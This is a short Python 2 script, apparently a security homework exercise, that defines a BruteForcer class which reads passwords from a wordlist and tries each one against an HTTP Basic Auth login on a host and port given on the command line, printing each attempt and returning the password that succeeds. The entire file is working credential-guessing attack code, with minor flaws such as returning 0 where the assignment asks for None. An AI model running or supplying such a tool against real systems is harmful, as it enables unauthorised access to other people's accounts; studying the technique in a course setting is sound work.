#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  untitled.py
#  
#  Copyright 2013 collin <collin@collin-virtual-machine>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#Homework  add new method to class called  bruteforce have it take username and password file make it return None if password is not found return the password if it is found
#  
import sys
import httplib

class BruteForcer(object):
	def __init__(self, hostname, port):
		self.hostname = hostname
		self.port = port
		self.http_h = httplib.HTTPConnection(self.hostname, self.port)

	def authenticate(self, username, password):
		headers = {}
		auth_data = 'Basic ' + (username + ':' + password).encode('base64').strip()
		headers['Authorization'] = auth_data
		self.http_h.request('GET', '/succes.jpg', headers = headers)
		response = self.http_h.getresponse()
		if response.status == 401 or response.status == 403:
			return False
		return True

	def brute_force(self, username, password_file):
		password_file_h = open(password_file, 'r')
		password = password_file_h.readline()
		password = password.rstrip()
		while password:
			print('trying ' + username + ' ' + password)
			if self.authenticate(username, password):
				print('sucessful login')
				print('username ' + username + ' the password is ' + password)
				return password
				break
			password = password_file_h.readline()
			password = password.rstrip()
		password_file_h.close()
		return 0

def main():
	brute_forcer = BruteForcer(sys.argv[1], sys.argv[2])
	brute_forcer.brute_force(sys.argv[3], sys.argv[4])
	
	return 0
if __name__ == '__main__':
	main()

